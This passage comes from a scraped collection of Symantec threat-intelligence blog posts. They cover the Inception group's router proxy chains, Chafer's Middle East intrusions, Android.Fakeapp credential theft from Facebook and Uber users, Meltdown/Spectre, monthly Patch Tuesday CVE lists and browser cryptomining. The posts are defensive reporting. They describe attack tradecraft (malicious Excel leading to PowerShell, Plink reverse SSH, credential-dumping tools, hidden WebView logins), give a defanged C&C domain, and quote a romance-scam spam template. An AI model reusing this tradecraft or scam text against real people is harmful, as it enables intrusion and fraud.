disabled. Inception is continuing to use chains of infected routers to act as proxies and mask communications between the attackers and the cloud service providers they use. Certain router manufacturers have UPnP listening on WAN as a default configuration. Akamai research has found that there are 765,000 devices vulnerable to this attack. These routers are hijacked by Inception and configured to forward traffic from one port to another host on the internet. Abuse of this service requires no custom malware to be injected on the routers and can be used at scale very easily. Inception strings chains of these routers together to create multiple proxies to hide behind. Every connection builds different chains of infected routers and once the connection is complete, it cleans up after itself. In several cases, Symantec has been able to follow the entire chain of compromised routers and found it led to a virtual private server (VPS), meaning the attackers have employed an additional layer of security by routing communications through rented hosting servers. Inception has an ongoing interest in mobile devices and has previously developed malware to infect Android (Android.Lastacloud), iOS (IOS.Lastaccoud) and BlackBerry devices (BBOS.Lastacloud). Mobile malware continues to be deployed and the group has made some modifications to its Android malware. The malware is spread via SMS messages and emails containing malicious links. Once installed, it uses user profile pages on online forums as dead drops for its C&C. Even prior to its discovery in 2014, Inception went to great lengths both to avoid detection and conceal its location. Exposure hasn’t deterred the group. Instead, it has redoubled its efforts, adding more layers of obfuscation to an already complex attack framework. Its persistence, stealth, and global reach mean the group continues to pose an ongoing risk to organizations, particularly in its areas of interest, which include defense, aerospace, energy, governments, telecoms, media, and finance. Aside from a suite of advanced modular malware, the group is notable for its ability to make use of new platforms such as the cloud, IoT, and mobile to facilitate its attacks. An “early adopter”, Inception’s tactics may point the way towards how other espionage groups may modify their methods in years to come. Symantec has had protection for all of the Inception Framework tools since the initial emergence of the group in 2014.  The following detections are in place today: File-based protection Network Protection Products Customers with Webpulse-enabled products are protected against activity associated with Inception The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. Network Protection Security Labs is a group of security experts within Network Protection Products doing advanced security research to continuously improve Symantec Network Products. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/inception-framework-hiding-behind-proxies"
  },
  {
    "title": "microsoft patch tuesday march 2018",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the March 2018 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-0872)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-0874)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0876)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-0930)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-0931)MS Rating: Critical Internet Explorer Information Disclosure Vulnerability(CVE-2018-0932)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-0933)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-0934)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0889)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0893)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0925)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-0936)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-0937)MS Rating: Critical Microsoft Edge Information Disclosure Vulnerability(CVE-2018-0939)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-0873)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-0879)MS Rating: Important Microsoft Browser Information Disclosure Vulnerability(CVE-2018-0891)MS Rating: Important Microsoft Browser Information Disclosure Vulnerability(CVE-2018-0927)MS Rating: Important Internet Explorer Information Disclosure Vulnerability(CVE-2018-0929)MS Rating: Important Internet Explorer Memory Corruption Vulnerability(CVE-2018-0935)MS Rating: Important Internet Explorer Elevation of Privilege Vulnerability(CVE-2018-0942)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Sharepoint Elevation of Privilege Vulnerability(CVE-2018-0947)MS Rating: Critical Microsoft Access Remote Code Execution Vulnerability(CVE-2018-0903)MS Rating: Important Microsoft Office Excel Security Bypass(CVE-2018-0907)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0909)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0910)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0911)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0912)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0913)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0914)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0915)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0916)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0917)MS Rating: Important Microsoft Office Information Disclosure Vulnerability(CVE-2018-0919)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0921)MS Rating: Important Microsoft Office Memory Corruption Vulnerability(CVE-2018-0922)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0923)MS Rating: Important Microsoft Exchange Information Disclosure Vulnerability(CVE-2018-0941)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0944)MS Rating: Important Microsoft Exchange Elevation of Privilege Vulnerability(CVE-2018-0940)MS Rating: Moderate Microsoft Exchange Information Disclosure Vulnerability(CVE-2018-0924)MS Rating: Low Cumulative Security Update for Microsoft ASP.NET Core ASP.NET Core Elevation Of Privilege Vulnerability(CVE-2018-0787)MS Rating: Important ASP.NET Core Denial Of Service Vulnerability(CVE-2018-0808)MS Rating: Important .NET Core Denial of Service Vulnerability(CVE-2018-0875)MS Rating: Important Cumulative Security Update for Microsoft Hyper-V Windows Hyper-V Denial of Service Vulnerability(CVE-2018-0885)MS Rating: Important Hyper-V Information Disclosure Vulnerability(CVE-2018-0888)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Information Disclosure Vulnerability(CVE-2018-0811)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0813)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0814)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0894)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0895)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0896)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0897)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0898)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0899)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0900)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0901)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0904)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0926)MS Rating: Important Win32k Elevation of Privilege Vulnerability(CVE-2018-0977)MS Rating: Important Cumulative Security Update for Microsoft Windows Windows GDI Elevation of Privilege Vulnerability(CVE-2018-0815)MS Rating: Important Windows GDI Elevation of Privilege Vulnerability(CVE-2018-0816)MS Rating: Important Windows GDI Elevation of Privilege Vulnerability(CVE-2018-0817)MS Rating: Important Windows Installer Elevation of Privilege Vulnerability(CVE-2018-0868)MS Rating: Important Windows Desktop Bridge VFS Elevation of Privilege Vulnerability(CVE-2018-0877)MS Rating: Important Windows Remote Assistance Information Disclosure Vulnerability(CVE-2018-0878)MS Rating: Important Windows Desktop Bridge Elevation of Privilege Vulnerability(CVE-2018-0880)MS Rating: Important Microsoft Video Control Elevation of Privilege Vulnerability(CVE-2018-0881)MS Rating: Important Windows Desktop Bridge Elevation of Privilege Vulnerability(CVE-2018-0882)MS Rating: Important Windows Shell Remote Code Execution Vulnerability(CVE-2018-0883)MS Rating: Important Windows Security Bypass Vulnerability(CVE-2018-0884)MS Rating: Important CredSSP Remote Code Execution Vulnerability(CVE-2018-0886)MS Rating: Important CNG Security Bypass Vulnerability(CVE-2018-0902)MS Rating: Important Windows Storage Services Elevation of Privilege Vulnerability(CVE-2018-0983)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-march-2018"
  },
  {
    "title": "latest intelligence february 2018",
    "content": "Some of the key takeaways fromFebruary’s Latest Intelligence, and the threat landscape in general, include the Chafer attack group mounts further operations against targets in the Middle East, the email malware rate remains low, and a mobile threat attempts to log into Facebook accounts to steal credentials. After a significant drop last month, the email malware rate rose again in February. However, at 1 in 645 emails, the current rate is still quite a bit lower than what was generally seen in the second half of 2017. This is likely due to lower levels of email activity by the Necurs botnet, little of which served up malware during February. The Chafer attack group has been observed carrying out further operations against organizations in the Middle East, according tonew research by Symantec. The group has been seen working its way further into targets in the telecom and transport industries, using new tools to traverse the networks, primarily to carry out surveillance activities. This recent activity indicates that the group remains highly active, working to hone its tools and tactics. The global spam rate declined slightly in February, dropping to 55.1 percent. However, the rate remains above 55 percent, as it has for 6 of the last 7 months. The Finance, Insurance, & Real Estate sector tops our list of industry spam rates, while last month’s top sector, Mining, dropped to fifth place. While quiet on the email malware front, there were a couple large spam runs sent by the Necurs botnet during the month. The first run was a continuation of a run we mentioned last month:a classic fake romance-themed scam, using a simple subject line of “hi”. This scam continued into February and the lead-up to Valentine’s Day, offering the semblance of a romantic encounter in order to scam the user. Hi [YOUR EMAIL HANDLE], My name is [RANDOM NAME] and i'm writing you to tell you that you are super cute from your photos on Facebook. I myself am from Russia, but now I live in the USA. I want to get to know you more! If you have the same, email me, this is my email [PREDETERMINED DOMAIN]. Lets know each other better. The second major Necurs campaign came later in the month and contained an attached PDF with advertisements for online pharmaceuticals. The subject lines were a random “Offer”, “Discount”, “Sale”, “Coupon”, or “Final sale”, followed by a random 7- to 9-digit number. The phishing rate dropped in February, coming in at 1 in 3,331 emails. While slightly lower than January, overall rates have hovered in the 1 in 2,000-3,000 range for the last 10 months. The Agriculture, Forestry, & Fishing sector had the highest industry phishing rate with 1 in 1,854 emails, followed by Retail Trade at 1 in 2,505 emails. A phishing scam mimicking a customer service notice from Netflix has been making the rounds, attempting totrick recipients into divulging personally identifiable informationsuch as credit card numbers. The phishing emails attempt to trick a user into believing their Netflix membership will be suspended if they do not validate their billing information. Manual sharing topped social media scams in February, comprising 62.78 percent of scams, while Fake Offers dropped more than 10 percentage points, from 29.75 percent to 19.49 percent. Coming in third for February, Like Jacking increased 1.29 percentage points at 17.25 percent. A newly discovered version of the Fakeapp Android malware familyhas been discovered by Symantec researchersattempting to log into Facebook accounts in order to steal user names and passwords, as well as a variety of personal details available in the user’s profile. The threat gains access to the user’s account by displaying a fake login page once it has compromised the device. The threat will periodically display this message until the user credentials or the threat is removed. This is just a snapshot of the news for the month. Check out theLatest Intelligencefor the big picture of the threat landscape with more charts, tables, and analysis. Ben works for Symantec’s Security Response team, where he dives deep into the threat data, looking at long-term trends, and surfacing occasionally to submit blogs, whitepapers, graphics, and video content. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/latest-intelligence-february-2018"
  },
  {
    "title": "chafer latest attacks reveal heightened ambitions",
    "content": "Chafer, the Iran-based targeted attack group, mounted further operations throughout 2017, attacking more organizations in the Middle East and beyond, and deploying several new tools. The group staged a number of ambitious new attacks last year, including the compromise of a major telecoms services provider in the region. There is also evidence that it attempted to attack a major international travel reservations firm. Chafer appears to be primarily engaged in surveillance and tracking of individuals, with most of its attacks likely carried out to gather information on targets or facilitate surveillance. Chafer has been active since at least July 2014 and its activitieswere first exposed by Symantec in December 2015, when it was found to be conducting targeted surveillance of domestic and international targets. At the time, many of its targets were individuals located in Iran, and it had already begun compromising telecom providers as well as airline companies in the Middle East region. Chafer appears to have been undeterred by its exposure in 2015 and continued to be very active during 2017, using seven new tools, rolling out new infrastructure, and attacking nine new target organizations in the region. The group hit organizations in Israel, Jordan, the United Arab Emirates, Saudi Arabia, and Turkey. Sectors targeted included airlines; aircraft services; software and IT services companies serving the air and sea transport sectors; telecoms services; payroll services; engineering consultancies; and document management software. Outside of the Middle East, Symantec has also found evidence of attacks against one African airline and attempts to compromise an international travel reservations firm. One of the organizations compromised by Chafer in 2017 was a telecoms services provider in the Middle East, which sells its solutions to multiple telecoms operators in the region. The ultimate goal of the attack may have been to facilitate surveillance of end-user customers of telecoms operators. By moving two steps up the supply chain the attackers could potentially have carried out surveillance on a vast pool of end-users. Alongside evidence of compromise of the organization itself, Symantec also found a copy of one of the company’s own files, relating to its messaging software, on a staging server used by Chafer. The file was in a directory alongside a number of hacking tools used by the attackers. A second target outside the Middle East provides further confirmation of Chafer’s heightened ambitions in recent times. Symantec found evidence that it had tried to compromise a large international travel reservations firm. There was no indication that the attack was successful, but Chafer did successfully infiltrate an African airline that is a customer of the reservations firm. The group hit organizations in Israel, Jordan, the United Arab Emirates, Saudi Arabia, and Turkey. Sectors targeted included airlines; aircraft services; software and IT services companies serving the air and sea transport sectors; telecoms services; payroll services; engineering consultancies; and document management software. In the earlier attacks from 2015, Symantec found evidence that Chafer had been compromising targeted organizations by attacking their web servers, likely through SQL injection attacks, in order to drop malware onto them. In 2017, the group added a new infection method to its toolkit, using malicious documents which are likely circulated using spear-phishing emails sent to individuals working in targeted organizations. These documents were Excel spreadsheets. When opened, they downloaded a malicious VBS file that in turn ran a PowerShell script. Several hours later, a dropper would appear on the compromised computer. This would install three files on the computer, an information stealer, a screen capture utility, and an empty executable. The screen capture utility appeared to be used for initial information gathering, as it was only used briefly at the beginning of each infection and not seen again. The information stealer was capable of stealing the contents of the clipboard, taking screenshots, recording keystrokes and stealing files and user credentials. After this initial activity, the attackers usually downloaded more of their tools to the computer using a PowerShell downloader and began moving across the victim’s network. Symantec has seen Chafer use seven new tools in its more recent campaigns, in addition to malware it is previously known to have used. Most of the new tools are freely available, off-the-shelf tools, put to a malicious use. The new tools include: Chafer has also continued to use tools previously associated with the group, including its own custom backdoor Remexi (Backdoor.Remexi); the aforementioned PsExec; Mimikatz (Hacktool.Mimikatz), a free tool capable of changing privileges, exporting security certificates, and recovering Windows passwords in plaintext; Pwdump (Pwdump) a tool that is used to grab Windows password hashes from a remote Windows computer; and Plink (PuTTY Link) a command-line utility used to create reverse SSH sessions. Chafer has used these tools in concert to traverse targeted networks. The group has recently adopted NSSM to maintain persistence and install the service which runs Plink on the compromised computer. Plink is then used to open reverse SSH sessions from the attacker's server to the RDP port on the victim computer. This presumably gives them RDP access to the compromised computer. Once a foothold is established, the attackers use PsExec, Remcom, and SMB hacking tools to begin moving across the victim’s network. Chafer has also begun using new infrastructure. The domain win7-updates[.]com is being used by the group as a command and control address. The domain has been referenced several times in command lines, e.g: It has also been embedded in a dropper: Symantec also discovered multiple IP addresses that were used as infrastructure by the attackers. It is unclear whether these were leased or hijacked, but the fact that many of them appear to follow a pattern—with the latter three numbers of each address often running in sequence—makes it likely they were deliberately selected by the attackers. In one case, Symantec found what appeared to be a staging server used by the attackers. The server belonged to one of the targeted organizations. Copies of many of the tools used by the group were discovered on the server. The attackers didn’t even bother hiding their activity and saved items to the desktop, often without renaming them. Chafer’s activities have some links to another group known as Crambus (aka Oilrig). Both groups have been observed using the same IP address for command and control purposes. In addition to this, both groups have been seen using a similar infection vector, namely an Excel document which drops a malicious VBS file. Both VBS files reference the same file path, containing the same misspelling: Are the two groups one and the same? While this may be a possibility, at present there isn’t enough evidence to support that hypothesis. What is more likely is that the two groups are known to each other and enjoy access to a shared pool of resources. Chafer’s recent activities indicate that the group remains highly active, is continuing to hone its tools and tactics, and has become more audacious in its choice of targets. Although a regional actor, the group has followed two trends seen globally among targeted attack groups. The first is a greater reliance on freely available software tools, also known as “living off the land.” By limiting their use of malware, groups such as Chafer hope to be less conspicuous on a victim’s network and, if discovered, make their attack more difficult to attribute. The second trend is towards attacks on the supply chain, compromising organizations with the goal of then attacking the customers, or even the customers of the customers, of those organizations. These attacks require more “steps” to reach their ultimate target, which adds additional time and risk for attackers to reach their targets.  However these attacks also leverage trusted channels into the eventual target, e.g., through a trusted supplier, allowing attackers to potentially circumvent security systems at the organization they ultimately wish to compromise. These attacks are riskier but come with a potentially higher reward and, if successful, could give the attackers access to a vast pool of potential targets. Chafer’s recent activities indicate that the group remains highly active, is continuing to hone its tools and tactics, and has become more audacious in its choice of targets. Although a regional actor, the group has followed two trends seen globally among targeted attack groups. Symantec has the following protection in place to protect customers against these attacks: File-based protection IPS: network-based protection The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/chafer-latest-attacks-reveal-heightened-ambitions"
  },
  {
    "title": "android malware harvests facebook details",
    "content": "Recently, there have beenreportsof mobile threats stealing Facebook login credentials, such as user names and passwords. We’ve encountered new Android malware (detected asAndroid.Fakeapp) that takes a more aggressive approach: logging into Facebook accounts and harvesting account details directly from victims’ devices. The majority of the victims are located in the Asia-Pacific region. The malware we’ve encountered was sourced from third-party markets. The apps target English speakers. Once installed, the malicious app immediately hides itself from the home screen, leaving only a service running in the background. This service takes the following steps to steal details from a Facebook user’s account: Using JavaScript from a hidden WebView, the threat silently logs into the compromised Facebook account. The malware hides the WebView by setting the display to be almost completely transparent (Figure 2). It then ensures that a CAPTCHA isn’t presented. If it is, it sends the event to the C&C server, clears caches and cookies, and retries later. Once the malware is logged into the Facebook page, it can leverage a wide range of capabilities to follow links and scrape the personal data of the victim and their friends, sending it back to the C&C server. This includes: The functionality that crawls the Facebook page has a surprising level of sophistication. The crawler has the ability to use the search functionality on Facebook and collect the results. Additionally, to harvest information that is shown using dynamic web techniques, the crawler will scroll the page and pull content via Ajax calls (Figures 4 and 5). MitigationWe advise users to follow these best practices to stay protected from mobile threats: ProtectionSymantec and Norton products detect this malware asAndroid.Fakeapp. Martin is a member of Symantec’s Security Technology and Response team who are focused on providing round-the-clock protection against current and future cyber threats. Shaun is a member of Symantec’s Security Technology and Response team where he is focused on security research, and innovation on mobile platforms. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/android-malware-harvests-facebook-details"
  },
  {
    "title": "microsoft patch tuesday february 2018",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the February 2018 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Microsoft Edge Information Disclosure Vulnerability(CVE-2018-0763)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0834)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0835)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0837)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0838)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0840)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0856)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0857)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0858)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0859)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0860)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0861)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-0836)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-0839)MS Rating: Important Windows Scripting Engine Memory Corruption Vulnerability(CVE-2018-0847)MS Rating: Important Scripting Engine Memory Corruption Vulnerability(CVE-2018-0866)MS Rating: Important Microsoft Edge Security Feature Bypass(CVE-2018-0771)MS Rating: Moderate Cumulative Security Update for Microsoft Office Microsoft Outlook Memory Corruption Vulnerability(CVE-2018-0852)MS Rating: Critical Microsoft Outlook Elevation of Privilege Vulnerability(CVE-2018-0850)MS Rating: Important Microsoft Office Memory Corruption Vulnerability(CVE-2018-0851)MS Rating: Important Microsoft Office Information Disclosure Vulnerability(CVE-2018-0853)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0864)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-0869)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2018-0841)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Elevation of Privilege Vulnerability(CVE-2018-0742)MS Rating: Important Windows Kernel Elevation of Privilege Vulnerability(CVE-2018-0756)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0757)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0810)MS Rating: Important Windows Kernel Elevation Of Privilege Vulnerability(CVE-2018-0820)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0829)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0830)MS Rating: Important Windows Kernel Elevation of Privilege Vulnerability(CVE-2018-0831)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-0843)MS Rating: Important Cumulative Security Update for Microsoft Windows StructuredQuery Remote Code Execution Vulnerability(CVE-2018-0825)MS Rating: Critical Windows EOT Font Information Disclosure Vulnerability(CVE-2018-0755)MS Rating: Important Windows EOT Font Information Disclosure Vulnerability(CVE-2018-0760)MS Rating: Important Windows EOT Font Information Disclosure Vulnerability(CVE-2018-0761)MS Rating: Important Windows EOT Font Information Disclosure Vulnerability(CVE-2018-0855)MS Rating: Important Windows Elevation of Privilege Vulnerability(CVE-2018-0809)MS Rating: Important Windows AppContainer Elevation Of Privilege Vulnerability(CVE-2018-0821)MS Rating: Important Windows NTFS Global Reparse Point Elevation of Privilege Vulnerability(CVE-2018-0822)MS Rating: Important Windows Storage Services Elevation of Privilege Vulnerability(CVE-2018-0826)MS Rating: Important Windows Security Feature Bypass Vulnerability(CVE-2018-0827)MS Rating: Important Windows Elevation of Privilege Vulnerability(CVE-2018-0828)MS Rating: Important Windows Information Disclosure Vulnerability(CVE-2018-0832)MS Rating: Important Windows Remote Code Execution Vulnerability(CVE-2018-0842)MS Rating: Important Windows Common Log File System Driver Elevation Of Privilege Vulnerability(CVE-2018-0844)MS Rating: Important Windows Common Log File System Driver Elevation Of Privilege Vulnerability(CVE-2018-0846)MS Rating: Important Named Pipe File System Elevation of Privilege Vulnerability(CVE-2018-0823)MS Rating: Important SMBv2/SMBv3 Null Dereference Denial of Service Vulnerability(CVE-2018-0833)MS Rating: Moderate More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-february-2018"
  },
  {
    "title": "meltdown spectre cpu bugs",
    "content": "Update: January 31, 2018 -Symantec has released the following detection for attempts to exploit the Multiple CPU Hardware Information Disclosure Vulnerability (CVE-2017-5754/Meltdown): Update: January 5, 2018 -Symantec has released the following detection for attempts to exploit the Multiple CPU Hardware Information Disclosure Vulnerability (CVE-2017-5753/Spectre): A series of newly discovered vulnerabilities affecting processor chips could permit attackers to gain unauthorized access to a computer’s memory.Dubbed Meltdown and Spectre, the vulnerabilities affect nearly all modern processors and can only be mitigated through operating system patches. Of the two, Meltdown poses the greatest threat because it is easier to exploit and affects all kinds of computers, including personal computers and virtual machines in the cloud. Symantec is not aware of either vulnerability being exploited in the wild. The vulnerabilities are significant, since a successful exploit could allow attackers to gain unauthorized access to sensitive data, including passwords. However, exploit of any vulnerable computer would require an attacker to gain access to the targeted computer via a prior step, such as running a malicious application on it; through JavaScript which triggers an exploit in order to run as native code; or running JavaScript to map the kernel. All of these malicious activities can be blocked by Symantec products. Nevertheless, users are advised to apply operating system patches as soon as they are made available. Both Meltdown and Spectre exploit flaws in processors in order to bypass memory isolation in the operating system. Operating systems are designed in a way to block one application from accessing memory being used by another. If memory isolation fails to work, a malicious application could steal information from memory being used by other applications. Meltdown (CVE-2017-5754) exploits a flaw in out-of-order execution, a performance feature found in many modern processor chips. The researchers who discovered it have confirmed that it affects every Intel processor since 1995 (with the exception of pre-2013 Intel Itanium and Intel Atom processors). However, they added that it remains unclear whether ARM and AMD processors are also affected by the vulnerability. If successfully exploited, an attacker can obtain a copy of the entire kernel address space, including any mapped physical memory, in other words, any data stored in memory at the time of the attack. Meltdown can be exploited regardless of the operating system a computer is running. It affects both individual computers and any computers hosting cloud services, meaning an attack on a single server could lead to the compromise of multiple virtual machines running on that server. Exploitation against cloud services is potentially the most worrying scenario, since the Meltdown can be exploited on a virtual machine in order to access memory from the host machine. Attackers could potentially buy space on a vulnerable cloud service and use it to stage an attack against other customers using the same host. Spectre (CVE-2017-5753andCVE-2017-5715) has a similar outcome but works in a slightly different way, and exploits a flaw in processor design to trick an application into leaking information stored in memory. According to the team who discovered Spectre, virtually all modern processors are affected by the vulnerability, including Intel, AMD, and ARM chips. Once again, the vulnerability is operating system agnostic. Users are advised to apply operating system patches immediately. Patches have already been released forMicrosoft Windows,Apple macOS, andLinuxto patch Meltdown. Spectre is reportedly more difficult to patch but also more difficult to exploit. Work is underway to harden software against any potential exploits. Operating system vendors have already warned that patching is likely to have a performance impact on affected computers. According to Microsoft, the impact may not be noticeable on most consumer devices, however the specific impact “varies by hardware generation and implementation by the chip manufacturer.” The developers of the Linux patch said average performance could decline by 5 percent, but instances of a 30 percent decline were observed. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/meltdown-spectre-cpu-bugs"
  },
  {
    "title": "android malware uber credentials deep links",
    "content": "While analyzing the most recentAndroid.Fakeappmalware variants, we came across a sample that was using a quite novel and different monetization technique, in addition to the regular overlay tricks asking users to enter their credit card details. This one would be of particular concern to Uber users on Android, which number in the millions worldwide. The Fakeapp variant we found had a spoofed Uber application user interface (UI) which pops up on the user’s device screen in regular intervals until the user gets tricked into entering their Uber ID (typically the registered phone number) and password. Figure 1 shows the fake Uber app UI displayed by the malware to get the user to enter their details. Once the user clicks the Next button (->), the malware sends the user ID and password to its remote server. Next, the malware tries to cover up the heist. To avoid alarming the user, the malware displays a screen of the legitimate app that shows the user’s current location, which would not normally arouse suspicion because that’s what’s expected of the actual app. This is where creators of this Fakeapp variant got creative. To show the said screen, the malware uses the deep link URI of the legitimate app that starts the app’s Ride Request activity, with the current location of the victim preloaded as the pickup point. To show the said screen, the malware uses the deep link URI of the legitimate app that starts the app’s Ride Request activity, with the current location of the victim preloaded as the pickup point. Deep links are URLs that take users directly to specific content in an app. Deep linking in Android is a way to identify a specific piece of content or functionality inside an app. It is much like a web URL, but for applications. For example, the Uber app has the following deep link URI for its Ride Request activity: Figure 3 illustrates the code snippet of the malware that fires the VIEW intent with the Ride Request deep link URI after exfiltrating the Uber credentials to its remote server. This case again demonstrates malware authors’ neverending quest for finding new social engineering techniques to trick and steal from unwitting users. Symantec recommends users follow these best practices to stay protected from mobile threats: Symantec and Norton products detect the threat discussed in this blog asAndroid.Fakeapp. Dinesh is a threat analyst specializing in mobile malware. He's constantly researching and creating protection and remediation routines, building a knowledge graph of threat families using machine learning based classification and clustering techniques. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/android-malware-uber-credentials-deep-links"
  },
  {
    "title": "browser mining cryptocurrency",
    "content": "Browser-based cryptocurrency mining activity exploded in the last few months of 2017. After many years of deathly silence, the catalyst appears to be the launch of a new browser-based mining service in September by Coinhive. This service wraps everything up nicely in an easy-to-use package for website owners and has injected new life into an idea that was long thought of as dead and buried. Browser-based mining, as its name suggests, is a method of cryptocurrency mining that happens inside a browser and is implemented using scripting language. This is different compared to the more widely known file-based cryptocurrency mining approach which involves downloading and running a dedicated executable file. Browser-based mining dates back to May of 2011 when an innovative service called BitcoinPlus.com was initially launched—back when Bitcoin was cheap and mining was easy—not to be confused with another cryptocurrency known as Bitcoin Plus.org (XBC). That service was in many ways remarkably similar to its modern reincarnation, Coinhive. It used JavaScript code for pooled mining and website owners could sign up to the service and embed these scripts into their web pages to make page visitors mine for them. The big difference is that back in 2011 BitcoinPlus.com, as its name suggests, mined for Bitcoin (BTC) whereas the current browser-based miners like Coinhive are mining for Monero (XMR)—a newer, privacy-focused cryptocurrency. Back in 2011, before theadvent of ASIC mining in 2013, Bitcoin was still in its infancy,mining difficultywas relatively low, and cryptocurrency prices were even lower. It was (just about) possible to do some mining with home-grade hardware. Even though it was possible at that time to mine for Bitcoin via BitcoinPlus.com, the reality of the situation was that it was largely a futile exercise. The reward was minuscule compared to the amount of mining power and electricity required. Of course, this was back in the days before Bitcoin prices shot through the roof—in June 2011, Bitcoin reached the then lofty heights of almost US$30. Due to this fundamental profitability problem with browser-based mining, it soon withered away. However, the idea was once again revived in December 2013 by a group of MIT students in a project called Tidbit—ostensibly touted as an alternative way for website owners to raise 